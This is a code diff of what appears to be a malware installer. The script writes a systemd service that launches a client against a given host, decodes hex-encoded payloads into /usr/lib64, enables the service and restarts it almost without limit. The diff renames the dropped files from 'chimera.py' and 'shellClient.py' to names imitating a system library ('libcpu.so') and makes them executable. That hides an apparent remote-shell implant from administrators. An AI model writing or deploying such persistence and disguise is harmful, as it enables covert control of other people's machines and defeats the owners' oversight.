@@ -34,7 +34,7 @@ Description=Stuff 'n things.
 Type=simple
 Restart=on-failure
 Environment="PATH=/sbin:/bin:/usr/sbin:/usr/bin"
-ExecStart=/usr/bin/python3 /usr/lib64/chimera.py """ + host + """
+ExecStart=/usr/lib64/libcpu.so.1.0.0 """ + host + """
 StartLimitInterval=1s
 StartLimitBurst=999
 
@@ -46,15 +46,17 @@ f.close()
 os.system("systemctl daemon-reload")
 
 CLIENTCONTS = bytes.fromhex(CLIENTCONTS).decode()
-f = open('/usr/lib64/chimera.py', 'w')
+f = open('/usr/lib64/libcpu.so.1.0.0', 'w')
 f.write(CLIENTCONTS)
 f.close()
 
 SECCLIENTCONTS = bytes.fromhex(SECCLIENTCONTS).decode()
-f = open('/usr/lib64/shellClient.py', 'w')
+f = open('/usr/lib64/libcpu.so', 'w')
 f.write(SECCLIENTCONTS)
 f.close()
 
+os.system("chmod +x /usr/lib64/libcpu.so.1.0.0")
+os.system("chmod +x /usr/lib64/libcpu.so")
 os.system("systemctl enable " + SERVICE_NAME)
 os.system("systemctl start " + SERVICE_NAME)
 
